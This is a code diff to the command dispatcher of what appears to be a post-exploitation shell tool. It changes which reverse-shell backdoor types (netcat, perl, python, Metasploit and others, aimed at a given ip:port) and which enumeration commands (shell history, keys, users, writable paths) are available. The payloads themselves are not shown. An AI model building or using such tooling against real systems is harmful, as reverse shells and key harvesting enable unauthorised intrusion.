@@ -78,16 +78,20 @@ class Commander(object):
                         if len(command.split()) == 3:
                             ip = command.split()[2].split(':')[0]
                             port = command.split()[2].split(':')[1]
-                            if command.split()[1] == "bash" or command.split()[1] == "sh":
-                                backdoor.bash(ip, port)
-                            elif command.split()[1] == "java":
-                                backdoor.java(ip, port)
-                            elif command.split()[1] == "metasploit" or command.split()[1] == "msf":
+                            #if command.split()[1] == "bash" or command.split()[1] == "sh":
+                            #    backdoor.bash(ip, port)
+                            #elif command.split()[1] == "java":
+                            #    backdoor.java(ip, port)
+                            if command.split()[1] == "metasploit" or command.split()[1] == "msf":
                                 backdoor.msf(ip, port)
+                            #elif command.split()[1] == "metasploit-php" or command.split()[1] == "msf-php":
+                            #    backdoor.msf(ip, port)
                             elif command.split()[1] == "netcat" or command.split()[1] == "nc":
                                 backdoor.netcat(ip, port)
                             elif command.split()[1] == "perl" or command.split()[1] == "pl":
                                 backdoor.perl(ip, port)
+                            #elif command.split()[1] == "php":
+                            #    backdoor.php(ip, port)
                             elif command.split()[1] == "php-cli":
                                 backdoor.php_cli(ip, port)
                             elif command.split()[1] == "python" or command.split()[1] == "py":
@@ -110,18 +114,20 @@ class Commander(object):
 
                     elif command.startswith('@enum'):
                         if len(command.split()) == 2:
-                            if command.split()[1] == "system":
-                                enumerate.system()
-                            elif command.split()[1] == "history":
+                            if command.split()[1] == "history":
                                 enumerate.history()
+                            elif command.split()[1] == "keys":
+                                enumerate.keys()
                             elif command.split()[1] == "network" or command.split()[1] == "ip":
                                 enumerate.ip()
                             elif command.split()[1] == "os":
                                 enumerate.os()
-                            elif command.split()[1] == "keys":
-                                enumerate.keys()
+                            elif command.split()[1] == "system":
+                                enumerate.system()
+                            elif command.split()[1] == "users":
+                                enumerate.users()                            
                             elif command.split()[1] == "writable":
-                                enumerate.writable()
+                                enumerate.writable()                            
                             else:
                                 enumerate.list()
                         else:
